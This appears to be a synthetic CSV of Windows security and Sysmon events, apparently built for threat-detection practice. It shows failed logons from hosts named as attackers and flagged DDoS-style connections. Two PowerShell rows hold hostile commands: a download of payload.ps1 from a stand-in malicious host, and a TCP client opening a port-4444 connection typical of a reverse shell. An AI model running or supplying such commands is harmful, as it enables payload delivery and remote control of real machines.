EventID,SystemTime,TargetUserName,IpAddress,WorkstationName,ProcessName,EventDescription,ScriptContent,SourcePort,DestinationPort
4624,2025-05-15T15:30:12.345678,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4625,2025-05-15T15:30:15.456789,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4625,2025-05-15T15:30:17.567890,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4104,2025-05-15T15:30:20.678901,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-Service | Where-Object {$_.Status -eq 'Running'},-,-,-
5156,2025-05-15T15:30:25.789012,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54321,80
1,2025-05-15T15:30:30.890123,IEUser,-,SRV01,C:\Windows\explorer.exe,Sysmon Process Create,C:\Windows\explorer.exe,-,-,-
4104,2025-05-15T15:30:35.901234,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\Temp\payload.ps1,-,-,-
4625,2025-05-15T15:30:40.012345,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T15:30:45.123456,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
5156,2025-05-15T15:30:50.234567,-,192.168.1.201,BOTNET-PC02,-,Network Connection (Potential DDoS),-,54322,80
4625,2025-05-15T15:31:00.345678,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4104,2025-05-15T15:31:05.456789,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.1',4444),-,-,-
